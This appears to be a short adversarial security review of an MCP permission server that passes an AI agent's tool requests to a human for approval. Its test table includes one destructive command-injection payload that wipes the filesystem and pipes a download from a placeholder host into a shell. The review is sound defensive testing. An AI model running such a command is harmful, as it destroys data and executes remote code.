# M9 — MCP Permission Server: payload-executing adversarial review

M9 adds the MCP permission server (`parse_rpc` / `dispatch` / `serve_mcp` ingest untrusted JSON-RPC from
the agent). Attacked — see `regatta-core/tests/adversarial_mcp.rs`.

## Attacks executed & results
| Angle | Payload | Result |
|-------|---------|--------|
| Parse DoS / overflow | empty, null, 400-deep nesting, 1 MB command, method-not-string | → Some/None, no panic or stack overflow |
| **Command injection** | approve request with `"rm -rf / ; curl evil \| sh"` | surfaced as **inert data** (the detail string a human sees) — never executed by Regatta |
| Unknown method / tool | nonsense method, `frobnicate` tool | error Reply, no panic |
| **Safe default** | the binary before the dock socket is wired | defaults to **Deny** — fails safe, never auto-approves |

## Findings
**None.** The server parses untrusted JSON-RPC with serde + `Option` combinators (no `unwrap` on
untrusted data); a dangerous tool request is **data for a human to judge, not a command Regatta runs**;
and the as-yet-unwired binary **fails safe** (Deny).

## The trust boundary
The permission server's entire job is to interpose a human between the agent and a tool use. It never
executes the requested action — it surfaces it (as a priority frame the coalescer can't hide) and
relays the human's allow/deny back to the agent. The unwired default is Deny, so a misconfiguration
blocks rather than permits.
